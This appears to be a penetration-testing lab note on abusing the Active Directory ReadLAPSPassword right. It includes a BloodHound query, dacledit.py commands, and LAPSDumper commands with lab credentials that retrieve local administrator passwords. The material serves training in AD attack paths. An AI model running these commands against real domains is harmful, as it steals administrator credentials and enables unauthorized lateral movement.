
---
---
## ReadLAPSPassword

> Identifying LAPS Privileges

If we get access to an account that has privileges to read `LAPS` password attributes or with either `GenericAll` or `AllExtendedRights` access rights against a target computer configured with `LAPS`, we can retrieve the local administrator password from Active Directory by reading the `ms-MCS-AdmPwd` attribute.

`BloodHound` has an edge named [ReadLAPSPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readlapspassword), which searches if an account has the `ReadProperty` access right over the attribute `ms-MCS-AdmPwd` and if `ms-MCS-AdmPwdExpirationTime` is set. This edge helps us to identify potential attack paths by revealing accounts that can read the `LAPS` password attribute. We can use the following cypher query to identify accounts with the `ReadLAPSPassword` access right:

```cypher
MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p
```

![read_laps_passwords.jpg](https://academy.hackthebox.com/storage/modules/219/read_laps_passwords.jpg)

> Searching DACLs for Rita

```bash
python3 examples/dacledit.py -principal rita -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```

> Searching DACL LAPS Readers Group

```bash
python3 examples/dacledit.py -principal 'LAPS READERS' -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```

## Abusing ReadProperty ( ReadLAPSPassword) from Linux

```c
anas21@htb[/htb]$ git clone https://github.com/n00py/LAPSDumper -q
anas21@htb[/htb]$ cd LAPSDumper
anas21@htb[/htb]$ python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
```
